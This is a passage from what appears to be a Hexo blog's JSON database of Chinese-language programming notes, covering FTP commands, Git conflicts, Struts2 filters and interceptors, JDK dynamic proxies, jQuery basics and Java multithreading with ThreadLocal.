缺省时使用stream结构。<br>64.sunique：将远程主机文件名存储设置为只一(与runique对应)。<br>65.system：显示远程主机的操作系统类型。<br>66.tenex：将文件传输类型设置为TENEX机的所需的类型。<br>67.tick：设置传输时的字节计数器。<br>68.trace：设置包跟踪。<br>69.type[type-name]：设置文件传输类型为type-name，缺省为ascii，如:type binary，设置二进制传输方式。<br>70.umask[newmask]：将远程服务器的缺省umask设置为newmask，如：umask 3<br>71.user user-name[password][account]：向远程主机表明自己的身份，需要口令时，必须输入口令，如：user anonymous my@email。<br>72.verbose：同命令行的-v参数，即设置详尽报告方式，ftp 服务器的所有响 应都将显示给用户，缺省为on.<br>73.?[cmd]：同help.   </p>\n"},{"title":"FCK上传图片","date":"2017-01-31T06:36:14.000Z","_content":"![JavaEE](FCK上传图片/1.png)","source":"_posts/FCK上传图片.md","raw":"---\ntitle: FCK上传图片\ndate: 2017-01-31 14:36:14\ntags: JavaEE\n---\n![JavaEE](FCK上传图片/1.png)","slug":"FCK上传图片","published":1,"updated":"2018-01-31T06:37:20.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44tvq000dmfahs6f0y04c","content":"<p><img src=\"FCK上传图片/1.png\" alt=\"JavaEE\"></p>\n","site":{"data":{}},"excerpt":"","more":"<p><img src=\"FCK上传图片/1.png\" alt=\"JavaEE\"></p>\n"},{"title":"Freemarker页面静态化","date":"2016-04-21T06:50:18.000Z","_content":"![JavaEE](Freemarker页面静态化/1.png)","source":"_posts/Freemarker页面静态化.md","raw":"---\ntitle: Freemarker页面静态化\ndate: 2016-04-21 14:50:18\ntags: JavaEE\n---\n![JavaEE](Freemarker页面静态化/1.png)","slug":"Freemarker页面静态化","published":1,"updated":"2018-01-31T06:52:16.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44tvs000fmfahakn533s3","content":"<p><img src=\"Freemarker页面静态化/1.png\" alt=\"JavaEE\"></p>\n","site":{"data":{}},"excerpt":"","more":"<p><img src=\"Freemarker页面静态化/1.png\" alt=\"JavaEE\"></p>\n"},{"title":"GIT原理","date":"2016-12-31T07:29:49.000Z","_content":"**版本冲突的形成：**\n对于同一个文件来说，当两个以上的用户在同一个版本下对文件进行了修改，在提交的时候就会发生版本的冲突。例如：\n\n假设A、B两个用户都在版本号为100的时候，更新了kingtuns.txt这个文件，A用户在修改完成之后提交kingtuns.txt到服务器，这个时候提交成功，这个时候kingtuns.txt文件的版本号已经变成101了。同时B用户在版本号为100的kingtuns.txt文件上作修改，修改完成之后提交到服务器时，由于不是在当前最新的101版本上作的修改，所以导致提交失败。\n**GIT常用命令原理图：**\n![GIT](GIT原理/1.png)","source":"_posts/GIT原理.md","raw":"---\ntitle: GIT原理\ndate: 2016-12-31 15:29:49\ntags: GIT\n---\n**版本冲突的形成：**\n对于同一个文件来说，当两个以上的用户在同一个版本下对文件进行了修改，在提交的时候就会发生版本的冲突。例如：\n\n假设A、B两个用户都在版本号为100的时候，更新了kingtuns.txt这个文件，A用户在修改完成之后提交kingtuns.txt到服务器，这个时候提交成功，这个时候kingtuns.txt文件的版本号已经变成101了。同时B用户在版本号为100的kingtuns.txt文件上作修改，修改完成之后提交到服务器时，由于不是在当前最新的101版本上作的修改，所以导致提交失败。\n**GIT常用命令原理图：**\n![GIT](GIT原理/1.png)","slug":"GIT原理","published":1,"updated":"2018-01-31T07:31:38.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44tvu000hmfahnn5vlkjv","content":"<p><strong>版本冲突的形成：</strong><br>对于同一个文件来说，当两个以上的用户在同一个版本下对文件进行了修改，在提交的时候就会发生版本的冲突。例如：</p>\n<p>假设A、B两个用户都在版本号为100的时候，更新了kingtuns.txt这个文件，A用户在修改完成之后提交kingtuns.txt到服务器，这个时候提交成功，这个时候kingtuns.txt文件的版本号已经变成101了。同时B用户在版本号为100的kingtuns.txt文件上作修改，修改完成之后提交到服务器时，由于不是在当前最新的101版本上作的修改，所以导致提交失败。<br><strong>GIT常用命令原理图：</strong><br><img src=\"GIT原理/1.png\" alt=\"GIT\"></p>\n","site":{"data":{}},"excerpt":"","more":"<p><strong>版本冲突的形成：</strong><br>对于同一个文件来说，当两个以上的用户在同一个版本下对文件进行了修改，在提交的时候就会发生版本的冲突。例如：</p>\n<p>假设A、B两个用户都在版本号为100的时候，更新了kingtuns.txt这个文件，A用户在修改完成之后提交kingtuns.txt到服务器，这个时候提交成功，这个时候kingtuns.txt文件的版本号已经变成101了。同时B用户在版本号为100的kingtuns.txt文件上作修改，修改完成之后提交到服务器时，由于不是在当前最新的101版本上作的修改，所以导致提交失败。<br><strong>GIT常用命令原理图：</strong><br><img src=\"GIT原理/1.png\" alt=\"GIT\"></p>\n"},{"title":"Interceptor和Filter","date":"2015-11-13T07:45:46.000Z","_content":"#### Filter的生命周期:\n1.当服务器启动的时候加载过滤器实例,调用init方法进行初始化\n2.当每一次请求的时候都调用doFilter方法进行处理\n3.关闭服务器的时候调用Destory进行销毁\n\n#### Filter与Interceptor的区别\n1.过滤器依赖于Servlet容器,而拦截器不依赖于Servlet容器\n2.过滤器基本对所有请求都进行过滤,而拦截器只对Action拦截\n3.过滤器是基于函数回调,拦截器是基于反射机制\n4.过滤器不能访问值栈中的数据,而拦截器可以\n\n#### 什么是Listener\n1.Listener是Servlet事件监听器，Servlet事件监听器就是一个实现特定接口的Java程序，\n2.专门用于监听Web应用程序中ServletContext、HttpSession和ServletRequest等域对象的创建和销毁过程，监听这些域对象属性的修改以及感知绑定到HttpSession域中某个对象的状态。","source":"_posts/Interceptor和Filter.md","raw":"---\ntitle: Interceptor和Filter\ndate: 2015-11-13 15:45:46\ntags: Struts2\n---\n#### Filter的生命周期:\n1.当服务器启动的时候加载过滤器实例,调用init方法进行初始化\n2.当每一次请求的时候都调用doFilter方法进行处理\n3.关闭服务器的时候调用Destory进行销毁\n\n#### Filter与Interceptor的区别\n1.过滤器依赖于Servlet容器,而拦截器不依赖于Servlet容器\n2.过滤器基本对所有请求都进行过滤,而拦截器只对Action拦截\n3.过滤器是基于函数回调,拦截器是基于反射机制\n4.过滤器不能访问值栈中的数据,而拦截器可以\n\n#### 什么是Listener\n1.Listener是Servlet事件监听器，Servlet事件监听器就是一个实现特定接口的Java程序，\n2.专门用于监听Web应用程序中ServletContext、HttpSession和ServletRequest等域对象的创建和销毁过程，监听这些域对象属性的修改以及感知绑定到HttpSession域中某个对象的状态。","slug":"Interceptor和Filter","published":1,"updated":"2018-01-31T07:46:58.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44tvv000jmfahngn2l8mk","content":"<h4 id=\"Filter的生命周期\"><a href=\"#Filter的生命周期\" class=\"headerlink\" title=\"Filter的生命周期:\"></a>Filter的生命周期:</h4><p>1.当服务器启动的时候加载过滤器实例,调用init方法进行初始化<br>2.当每一次请求的时候都调用doFilter方法进行处理<br>3.关闭服务器的时候调用Destory进行销毁</p>\n<h4 id=\"Filter与Interceptor的区别\"><a href=\"#Filter与Interceptor的区别\" class=\"headerlink\" title=\"Filter与Interceptor的区别\"></a>Filter与Interceptor的区别</h4><p>1.过滤器依赖于Servlet容器,而拦截器不依赖于Servlet容器<br>2.过滤器基本对所有请求都进行过滤,而拦截器只对Action拦截<br>3.过滤器是基于函数回调,拦截器是基于反射机制<br>4.过滤器不能访问值栈中的数据,而拦截器可以</p>\n<h4 id=\"什么是Listener\"><a href=\"#什么是Listener\" class=\"headerlink\" title=\"什么是Listener\"></a>什么是Listener</h4><p>1.Listener是Servlet事件监听器，Servlet事件监听器就是一个实现特定接口的Java程序，<br>2.专门用于监听Web应用程序中ServletContext、HttpSession和ServletRequest等域对象的创建和销毁过程，监听这些域对象属性的修改以及感知绑定到HttpSession域中某个对象的状态。</p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"Filter的生命周期\"><a href=\"#Filter的生命周期\" class=\"headerlink\" title=\"Filter的生命周期:\"></a>Filter的生命周期:</h4><p>1.当服务器启动的时候加载过滤器实例,调用init方法进行初始化<br>2.当每一次请求的时候都调用doFilter方法进行处理<br>3.关闭服务器的时候调用Destory进行销毁</p>\n<h4 id=\"Filter与Interceptor的区别\"><a href=\"#Filter与Interceptor的区别\" class=\"headerlink\" title=\"Filter与Interceptor的区别\"></a>Filter与Interceptor的区别</h4><p>1.过滤器依赖于Servlet容器,而拦截器不依赖于Servlet容器<br>2.过滤器基本对所有请求都进行过滤,而拦截器只对Action拦截<br>3.过滤器是基于函数回调,拦截器是基于反射机制<br>4.过滤器不能访问值栈中的数据,而拦截器可以</p>\n<h4 id=\"什么是Listener\"><a href=\"#什么是Listener\" class=\"headerlink\" title=\"什么是Listener\"></a>什么是Listener</h4><p>1.Listener是Servlet事件监听器，Servlet事件监听器就是一个实现特定接口的Java程序，<br>2.专门用于监听Web应用程序中ServletContext、HttpSession和ServletRequest等域对象的创建和销毁过程，监听这些域对象属性的修改以及感知绑定到HttpSession域中某个对象的状态。</p>\n"},{"title":"JDK动态代理","date":"2016-02-22T02:49:11.000Z","_content":"&emsp;&emsp;JDK动态代理是对对象做代理,需要获取到被代理的对象,同时要求被代理对象的类要实现接口然后通过proxy.newProxyInstance()创建代理对象, 代理对象调用invaoke()方法达到动态代理效果。\n#### 代理类的编写\n![JavaSE]( JDK动态代理/1.png)\n#### 目标对象(被代理对象)实现的接口定义\n![JavaSE]( JDK动态代理/2.png)\n#### 目标对象类(被代理类)\n![JavaSE]( JDK动态代理/3.png)\n#### 动态代理的测试类\n![JavaSE]( JDK动态代理/4.png)\n#### 总结:\n1.自定义MyinvacationHandler实现InvacationHandler接口,构造方法接收被代理对象\n2.实现invoke方法AOP思想\n3.获取proxy代理对象,proxy.newProxyInstance()\n","source":"_posts/JDK动态代理.md","raw":"---\ntitle: JDK动态代理\ndate: 2016-2-22 10:49:11\ntags: JavaSE\n---\n&emsp;&emsp;JDK动态代理是对对象做代理,需要获取到被代理的对象,同时要求被代理对象的类要实现接口然后通过proxy.newProxyInstance()创建代理对象, 代理对象调用invaoke()方法达到动态代理效果。\n#### 代理类的编写\n![JavaSE]( JDK动态代理/1.png)\n#### 目标对象(被代理对象)实现的接口定义\n![JavaSE]( JDK动态代理/2.png)\n#### 目标对象类(被代理类)\n![JavaSE]( JDK动态代理/3.png)\n#### 动态代理的测试类\n![JavaSE]( JDK动态代理/4.png)\n#### 总结:\n1.自定义MyinvacationHandler实现InvacationHandler接口,构造方法接收被代理对象\n2.实现invoke方法AOP思想\n3.获取proxy代理对象,proxy.newProxyInstance()\n","slug":"JDK动态代理","published":1,"updated":"2018-01-31T05:27:06.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44tvw000lmfah2jkbvfub","content":"<p>&emsp;&emsp;JDK动态代理是对对象做代理,需要获取到被代理的对象,同时要求被代理对象的类要实现接口然后通过proxy.newProxyInstance()创建代理对象, 代理对象调用invaoke()方法达到动态代理效果。</p>\n<h4 id=\"代理类的编写\"><a href=\"#代理类的编写\" class=\"headerlink\" title=\"代理类的编写\"></a>代理类的编写</h4><p><img src=\"JDK动态代理/1.png\" alt=\"JavaSE\"></p>\n<h4 id=\"目标对象-被代理对象-实现的接口定义\"><a href=\"#目标对象-被代理对象-实现的接口定义\" class=\"headerlink\" title=\"目标对象(被代理对象)实现的接口定义\"></a>目标对象(被代理对象)实现的接口定义</h4><p><img src=\"JDK动态代理/2.png\" alt=\"JavaSE\"></p>\n<h4 id=\"目标对象类-被代理类\"><a href=\"#目标对象类-被代理类\" class=\"headerlink\" title=\"目标对象类(被代理类)\"></a>目标对象类(被代理类)</h4><p><img src=\"JDK动态代理/3.png\" alt=\"JavaSE\"></p>\n<h4 id=\"动态代理的测试类\"><a href=\"#动态代理的测试类\" class=\"headerlink\" title=\"动态代理的测试类\"></a>动态代理的测试类</h4><p><img src=\"JDK动态代理/4.png\" alt=\"JavaSE\"></p>\n<h4 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结:\"></a>总结:</h4><p>1.自定义MyinvacationHandler实现InvacationHandler接口,构造方法接收被代理对象<br>2.实现invoke方法AOP思想<br>3.获取proxy代理对象,proxy.newProxyInstance()</p>\n","site":{"data":{}},"excerpt":"","more":"<p>&emsp;&emsp;JDK动态代理是对对象做代理,需要获取到被代理的对象,同时要求被代理对象的类要实现接口然后通过proxy.newProxyInstance()创建代理对象, 代理对象调用invaoke()方法达到动态代理效果。</p>\n<h4 id=\"代理类的编写\"><a href=\"#代理类的编写\" class=\"headerlink\" title=\"代理类的编写\"></a>代理类的编写</h4><p><img src=\"JDK动态代理/1.png\" alt=\"JavaSE\"></p>\n<h4 id=\"目标对象-被代理对象-实现的接口定义\"><a href=\"#目标对象-被代理对象-实现的接口定义\" class=\"headerlink\" title=\"目标对象(被代理对象)实现的接口定义\"></a>目标对象(被代理对象)实现的接口定义</h4><p><img src=\"JDK动态代理/2.png\" alt=\"JavaSE\"></p>\n<h4 id=\"目标对象类-被代理类\"><a href=\"#目标对象类-被代理类\" class=\"headerlink\" title=\"目标对象类(被代理类)\"></a>目标对象类(被代理类)</h4><p><img src=\"JDK动态代理/3.png\" alt=\"JavaSE\"></p>\n<h4 id=\"动态代理的测试类\"><a href=\"#动态代理的测试类\" class=\"headerlink\" title=\"动态代理的测试类\"></a>动态代理的测试类</h4><p><img src=\"JDK动态代理/4.png\" alt=\"JavaSE\"></p>\n<h4 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结:\"></a>总结:</h4><p>1.自定义MyinvacationHandler实现InvacationHandler接口,构造方法接收被代理对象<br>2.实现invoke方法AOP思想<br>3.获取proxy代理对象,proxy.newProxyInstance()</p>\n"},{"title":"JQuery基础知识","date":"2015-05-31T01:19:52.000Z","_content":"#### JQuery遍历Json数据\n\n\tvar json = [\n\t    {\"id\":\"1\",\"tagName\":\"apple\"},\n\t    {\"id\":\"2\",\"tagName\":\"orange\"},\n\t    {\"id\":\"3\",\"tagName\":\"banana\"},\n\t    {\"id\":\"4\",\"tagName\":\"watermelon\"},\n\t    {\"id\":\"5\",\"tagName\":\"pineapple\"}\n\t];\n\n\t$.each(json, function(idx, obj) {\n\t    alert(obj.tagName);\n\t});\n\n#### JQuery对象和Dom对象的相互转换\n          \nJquery对象是一个数组对象,可以通过[index]的方法得到相应的DOM对象:\n\n\tvar $userId = $(“#userId”); //Jquery对象\n\tvar userId = $userId[0]; //DOM对象\n\t\n另一个方法是Jquery本身提供的,通过get(index)方法得到相应的DOM对象:\n\t\n\tvar $userId = $(“#userId”); //Jquery对象\n\tvar userId = $userId.get(0); //DOM对象\n对于DOM对象,使用$()把DOM对象包装起来,就可以获得一个Jquery对象:\n\n\tvar userId = document.getElementById(“userId”); //Jquery对象 var \t\t$userId =$(userId); //DOM对象\n\n$(function(){})---$(document).ready(function)和window.onload的区别:\n\n\t1.两个方法的执行时机不一样,$(function(){})在文档的DOM树形成之后就开始执行,window.onload()是在所有资源加载完毕之后才开始执行\n\t2.$(function(){})比window.onload()先执行\n\t3.$(function(){})可以重复执行,window.onload()只能执行一次\n","source":"_posts/JQuery基础知识.md","raw":"---\ntitle: JQuery基础知识\ndate: 2015-05-31 09:19:52\ntags:  JQuery\n---\n#### JQuery遍历Json数据\n\n\tvar json = [\n\t    {\"id\":\"1\",\"tagName\":\"apple\"},\n\t    {\"id\":\"2\",\"tagName\":\"orange\"},\n\t    {\"id\":\"3\",\"tagName\":\"banana\"},\n\t    {\"id\":\"4\",\"tagName\":\"watermelon\"},\n\t    {\"id\":\"5\",\"tagName\":\"pineapple\"}\n\t];\n\n\t$.each(json, function(idx, obj) {\n\t    alert(obj.tagName);\n\t});\n\n#### JQuery对象和Dom对象的相互转换\n          \nJquery对象是一个数组对象,可以通过[index]的方法得到相应的DOM对象:\n\n\tvar $userId = $(“#userId”); //Jquery对象\n\tvar userId = $userId[0]; //DOM对象\n\t\n另一个方法是Jquery本身提供的,通过get(index)方法得到相应的DOM对象:\n\t\n\tvar $userId = $(“#userId”); //Jquery对象\n\tvar userId = $userId.get(0); //DOM对象\n对于DOM对象,使用$()把DOM对象包装起来,就可以获得一个Jquery对象:\n\n\tvar userId = document.getElementById(“userId”); //Jquery对象 var \t\t$userId =$(userId); //DOM对象\n\n$(function(){})---$(document).ready(function)和window.onload的区别:\n\n\t1.两个方法的执行时机不一样,$(function(){})在文档的DOM树形成之后就开始执行,window.onload()是在所有资源加载完毕之后才开始执行\n\t2.$(function(){})比window.onload()先执行\n\t3.$(function(){})可以重复执行,window.onload()只能执行一次\n","slug":"JQuery基础知识","published":1,"updated":"2018-01-31T05:23:28.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44tvx000nmfaharc80vem","content":"<h4 id=\"JQuery遍历Json数据\"><a href=\"#JQuery遍历Json数据\" class=\"headerlink\" title=\"JQuery遍历Json数据\"></a>JQuery遍历Json数据</h4><pre><code>var json = [\n    {&quot;id&quot;:&quot;1&quot;,&quot;tagName&quot;:&quot;apple&quot;},\n    {&quot;id&quot;:&quot;2&quot;,&quot;tagName&quot;:&quot;orange&quot;},\n    {&quot;id&quot;:&quot;3&quot;,&quot;tagName&quot;:&quot;banana&quot;},\n    {&quot;id&quot;:&quot;4&quot;,&quot;tagName&quot;:&quot;watermelon&quot;},\n    {&quot;id&quot;:&quot;5&quot;,&quot;tagName&quot;:&quot;pineapple&quot;}\n];\n\n$.each(json, function(idx, obj) {\n    alert(obj.tagName);\n});\n</code></pre><h4 id=\"JQuery对象和Dom对象的相互转换\"><a href=\"#JQuery对象和Dom对象的相互转换\" class=\"headerlink\" title=\"JQuery对象和Dom对象的相互转换\"></a>JQuery对象和Dom对象的相互转换</h4><p>Jquery对象是一个数组对象,可以通过[index]的方法得到相应的DOM对象:</p>\n<pre><code>var $userId = $(“#userId”); //Jquery对象\nvar userId = $userId[0]; //DOM对象\n</code></pre><p>另一个方法是Jquery本身提供的,通过get(index)方法得到相应的DOM对象:</p>\n<pre><code>var $userId = $(“#userId”); //Jquery对象\nvar userId = $userId.get(0); //DOM对象\n</code></pre><p>对于DOM对象,使用$()把DOM对象包装起来,就可以获得一个Jquery对象:</p>\n<pre><code>var userId = document.getElementById(“userId”); //Jquery对象 var         $userId =$(userId); //DOM对象\n</code></pre><p>$(function(){})—$(document).ready(function)和window.onload的区别:</p>\n<pre><code>1.两个方法的执行时机不一样,$(function(){})在文档的DOM树形成之后就开始执行,window.onload()是在所有资源加载完毕之后才开始执行\n2.$(function(){})比window.onload()先执行\n3.$(function(){})可以重复执行,window.onload()只能执行一次\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<h4 id=\"JQuery遍历Json数据\"><a href=\"#JQuery遍历Json数据\" class=\"headerlink\" title=\"JQuery遍历Json数据\"></a>JQuery遍历Json数据</h4><pre><code>var json = [\n    {&quot;id&quot;:&quot;1&quot;,&quot;tagName&quot;:&quot;apple&quot;},\n    {&quot;id&quot;:&quot;2&quot;,&quot;tagName&quot;:&quot;orange&quot;},\n    {&quot;id&quot;:&quot;3&quot;,&quot;tagName&quot;:&quot;banana&quot;},\n    {&quot;id&quot;:&quot;4&quot;,&quot;tagName&quot;:&quot;watermelon&quot;},\n    {&quot;id&quot;:&quot;5&quot;,&quot;tagName&quot;:&quot;pineapple&quot;}\n];\n\n$.each(json, function(idx, obj) {\n    alert(obj.tagName);\n});\n</code></pre><h4 id=\"JQuery对象和Dom对象的相互转换\"><a href=\"#JQuery对象和Dom对象的相互转换\" class=\"headerlink\" title=\"JQuery对象和Dom对象的相互转换\"></a>JQuery对象和Dom对象的相互转换</h4><p>Jquery对象是一个数组对象,可以通过[index]的方法得到相应的DOM对象:</p>\n<pre><code>var $userId = $(“#userId”); //Jquery对象\nvar userId = $userId[0]; //DOM对象\n</code></pre><p>另一个方法是Jquery本身提供的,通过get(index)方法得到相应的DOM对象:</p>\n<pre><code>var $userId = $(“#userId”); //Jquery对象\nvar userId = $userId.get(0); //DOM对象\n</code></pre><p>对于DOM对象,使用$()把DOM对象包装起来,就可以获得一个Jquery对象:</p>\n<pre><code>var userId = document.getElementById(“userId”); //Jquery对象 var         $userId =$(userId); //DOM对象\n</code></pre><p>$(function(){})—$(document).ready(function)和window.onload的区别:</p>\n<pre><code>1.两个方法的执行时机不一样,$(function(){})在文档的DOM树形成之后就开始执行,window.onload()是在所有资源加载完毕之后才开始执行\n2.$(function(){})比window.onload()先执行\n3.$(function(){})可以重复执行,window.onload()只能执行一次\n</code></pre>"},{"title":"Java多线程","date":"2018-01-31T06:57:54.000Z","_content":"#### 进程与线程的概念理解:\n\n\t进程:执行的应用程序.\n\t线程:程序执行的一条路径\n\n#### 线程的生命周期以及五中状态\n![javaSE](Java多线程/1.png)\n\n#### Java线程具有五中基本状态\n\n**新建状态（New）**：当线程对象对创建后，即进入了新建状态，如：Thread t = new MyThread();\n\n**就绪状态（Runnable）**：当调用线程对象的start()方法（t.start();），线程即进入就绪状态。处于就绪状态的线程，只是说明此线程已经做好了准备，随时等待CPU调度执行，并不是说执行了t.start()此线程立即就会执行；\n\n**运行状态（Running）**：当CPU开始调度处于就绪状态的线程时，此时线程才得以真正执行，即进入到运行状态。注：就     绪状态是进入到运行状态的唯一入口，也就是说，线程要想进入运行状态执行，首先必须处于就绪状态中；\n\n**阻塞状态（Blocked）**：处于运行状态中的线程由于某种原因，暂时放弃对CPU的使用权，停止执行，此时进入阻塞状态，直到其进入到就绪状态，才 有机会再次被CPU调用以进入到运行状态。根据阻塞产生的原因不同，阻塞状态又可以分为三种：\n\n\t1.等待阻塞：运行状态中的线程执行wait()方法，使本线程进入到等待阻塞状态；\n\n\t2.同步阻塞 -- 线程在获取synchronized同步锁失败(因为锁被其它线程所占用)，它会进入同步阻塞状态；\n\n\t3.其他阻塞 -- 通过调用线程的sleep()或join()或发出了I/O请求时，线程会进入到阻塞状态。当sleep()状态超时、join()等待线程终止或者超时、或者I/O处理完毕时，线程重新转入就绪状态。\n\n\n**死亡状态（Dead）**：线程执行完了或者因异常退出了run()方法，该线程结束生命周期。\n\n#### java中线程创建的几种形式\n\n1.继承Thread类,重写run方法\n          \n\t class MyThread extends Thread {\n\t      private int i = 0;\n\t      @Override\n\t      public void run() {\n\t\t  for (i = 0; i < 100; i++) {\n\t\t      System.out.println(Thread.currentThread().getName() + \" \" + i);\n\t\t }\n\t     }\n\t }\n\n     \n\tpublic class ThreadTest {\n\n\t    public static void main(String[] args) {\n\t\tfor (int i = 0; i < 100; i++) {\n\t\t    System.out.println(Thread.currentThread().getName() + \" \" + i);\n\t\t    if (i == 30) {\n\t\t        Thread myThread1 = new MyThread();     // 创建一个新的线程  myThread1  此线程进入新建状态\n\t\t        Thread myThread2 = new MyThread();     // 创建一个新的线程 myThread2 此线程进入新建状态\n\t\t        myThread1.start();                     // 调用start()方法使得线程进入就绪状态\n\t\t        myThread2.start();                     // 调用start()方法使得线程进入就绪状态\n\t\t    }\n\t\t}\n\t    }\n\t}\n\n2.实现runnable接口,重写run方法\n\n\tclass MyRunnable implements Runnable {\n\t    private int i = 0;\n\n\t    @Override\n\t    public void run() {\n\t\tfor (i = 0; i < 100; i++) {\n\t\t    System.out.println(Thread.currentThread().getName() + \" \" + i);\n\t\t}\n\t    }\n\t}\n\n\n\tpublic class ThreadTest {\n\n\t    public static void main(String[] args) {\n\t\tfor (int i = 0; i < 100; i++) {\n\t\t    System.out.println(Thread.currentThread().getName() + \" \" + i);\n\t\t    if (i == 30) {\n\t\t        Runnable myRunnable = new MyRunnable(); // 创建一个Runnable实现类的对象\n\t\t        Thread thread1 = new Thread(myRunnable); // 将myRunnable作为Thread target创建新的线程\n\t\t        Thread thread2 = new Thread(myRunnable);\n\t\t        thread1.start(); // 调用start()方法使得线程进入就绪状态\n\t\t        thread2.start();\n\t\t    }\n\t\t}\n\t    }\n\t}\n\n理解ThreadLocal:\nThreadLocal叫做 线程局部变量,\n1、每个线程都有自己的局部变量\n\n    每个线程都有一个独立于其他线程的上下文来保存这个变量，一个线程的本地变量对其他线程是不可见的（有前提，后面解释）\n\n2、独立于变量的初始化副本\n\n    ThreadLocal可以给一个初始值，而每个线程都会获得这个初始化值的一个副本，这样才能保证不同的线程都有一份拷贝。\n\n\n3、状态与某一个线程相关联\n    ThreadLocal 不是用于解决共享变量的问题的，不是为了协调线程同步而存在，而是为了方便每个线程处理自己的状态而引入的一个机制，理解这点对正确使用ThreadLocal至关重要。\n\nThreadLocal实现机制\n\n\t/**1、每个Thread对象内部都维护了一个ThreadLocalMap这样一个ThreadLocal的Map，可以存放若干个ThreadLocal。\n\n\tThreadLocal.ThreadLocalMap threadLocals = null;\n\t2、当我们在调用get()方法的时候，先获取当前线程，然后获取到当前线程的ThreadLocalMap对象，如果非空，那么取出ThreadLocal的value，否则进行初始化，初始化就是将initialValue的值set到ThreadLocal中。**/\n\n\tpublic T get() {\n\t    Thread t = Thread.currentThread();\n\t    ThreadLocalMap map = getMap(t);\n\t    if (map != null) {\n\t\tThreadLocalMap.Entry e = map.getEntry(this);\n\t\tif (e != null)\n\t\t    return (T)e.value;\n\t    }\n\t    return setInitialValue();\n\t}\n\n\n\n　事实上，从本质来讲，就是每个线程都维护了一个map，而这个map的key就是threadLocal，而值就是我们set的那个值，每次线程在get的时候，都从自己的变量中取值。","source":"_posts/Java多线程.md","raw":"---\ntitle: Java多线程\ndate: 2018-01-31 14:57:54\ntags: JavaSE\n---\n#### 进程与线程的概念理解:\n\n\t进程:执行的应用程序.\n\t线程:程序执行的一条路径\n\n#### 线程的生命周期以及五中状态\n![javaSE](Java多线程/1.png)\n\n#### Java线程具有五中基本状态\n\n**新建状态（New）**：当线程对象对创建后，即进入了新建状态，如：Thread t = new MyThread();\n\n**就绪状态（Runnable）**：当调用线程对象的start()方法（t.start();），线程即进入就绪状态。处于就绪状态的线程，只是说明此线程已经做好了准备，随时等待CPU调度执行，并不是说执行了t.start()此线程立即就会执行；\n\n**运行状态（Running）**：当CPU开始调度处于就绪状态的线程时，此时线程才得以真正执行，即进入到运行状态。注：就     绪状态是进入到运行状态的唯一入口，也就是说，线程要想进入运行状态执行，首先必须处于就绪状态中；\n\n**阻塞状态（Blocked）**：处于运行状态中的线程由于某种原因，暂时放弃对CPU的使用权，停止执行，此时进入阻塞状态，直到其进入到就绪状态，才 有机会再次被CPU调用以进入到运行状态。根据阻塞产生的原因不同，阻塞状态又可以分为三种：\n\n\t1.等待阻塞：运行状态中的线程执行wait()方法，使本线程进入到等待阻塞状态；\n\n\t2.同步阻塞 -- 线程在获取synchronized同步锁失败(因为锁被其它线程所占用)，它会进入同步阻塞状态；\n\n\t3.其他阻塞 -- 通过调用线程的sleep()或join()或发出了I/O请求时，线程会进入到阻塞状态。当sleep()状态超时、join()等待线程终止或者超时、或者I/O处理完毕时，线程重新转入就绪状态。\n\n\n**死亡状态（Dead）**：线程执行完了或者因异常退出了run()方法，该线程结束生命周期。\n\n#### java中线程创建的几种形式\n\n1.继承Thread类,重写run方法\n          \n\t class MyThread extends Thread {\n\t      private int i = 0;\n\t      @Override\n\t      public void run() {\n\t\t  for (i = 0; i < 100; i++) {\n\t\t      System.out.println(Thread.currentThread().getName() + \" \" + i);\n\t\t }\n\t     }\n\t }\n\n     \n\tpublic class ThreadTest {\n\n\t    public static void main(String[] args) {\n\t\tfor (int i = 0; i < 100; i++) {\n\t\t    System.out.println(Thread.currentThread().getName() + \" \" + i);\n\t\t    if (i == 30) {\n\t\t        Thread myThread1 = new MyThread();     // 创建一个新的线程  myThread1  此线程进入新建状态\n\t\t        Thread myThread2 = new MyThread();     // 创建一个新的线程 myThread2 此线程进入新建状态\n\t\t        myThread1.start();                     // 调用start()方法使得线程进入就绪状态\n\t\t        myThread2.start();                     // 调用start()方法使得线程进入就绪状态\n\t\t    }\n\t\t}\n\t    }\n\t}\n\n2.实现runnable接口,重写run方法\n\n\tclass MyRunnable implements Runnable {\n\t    private int i = 0;\n\n\t    @Override\n\t    public void run() {\n\t\tfor (i = 0; i < 100; i++) {\n\t\t    System.out.println(Thread.currentThread().getName() + \" \" + i);\n\t\t}\n\t    }\n\t}\n\n\n\tpublic class ThreadTest {\n\n\t    public static void main(String[] args) {\n\t\tfor (int i = 0; i < 100; i++) {\n\t\t    System.out.println(Thread.currentThread().getName() + \" \" + i);\n\t\t    if (i == 30) {\n\t\t        Runnable myRunnable = new MyRunnable(); // 创建一个Runnable实现类的对象\n\t\t        Thread thread1 = new Thread(myRunnable); // 将myRunnable作为Thread target创建新的线程\n\t\t        Thread thread2 = new Thread(myRunnable);\n\t\t        thread1.start(); // 调用start()方法使得线程进入就绪状态\n\t\t        thread2.start();\n\t\t    }\n\t\t}\n\t    }\n\t}\n\n理解ThreadLocal:\nThreadLocal叫做 线程局部变量,\n1、每个线程都有自己的局部变量\n\n    每个线程都有一个独立于其他线程的上下文来保存这个变量，一个线程的本地变量对其他线程是不可见的（有前提，后面解释）\n\n2、独立于变量的初始化副本\n\n    ThreadLocal可以给一个初始值，而每个线程都会获得这个初始化值的一个副本，这样才能保证不同的线程都有一份拷贝。\n\n\n3、状态与某一个线程相关联\n    ThreadLocal 不是用于解决共享变量的问题的，不是为了协调线程同步而存在，而是为了方便每个线程处理自己的状态而引入的一个机制，理解这点对正确使用ThreadLocal至关重要。\n\nThreadLocal实现机制\n\n\t/**1、每个Thread对象内部都维护了一个ThreadLocalMap这样一个ThreadLocal的Map，可以存放若干个ThreadLocal。\n\n\tThreadLocal.ThreadLocalMap threadLocals = null;\n\t2、当我们在调用get()方法的时候，先获取当前线程，然后获取到当前线程的ThreadLocalMap对象，如果非空，那么取出ThreadLocal的value，否则进行初始化，初始化就是将initialValue的值set到ThreadLocal中。**/\n\n\tpublic T get() {\n\t    Thread t = Thread.currentThread();\n\t    ThreadLocalMap 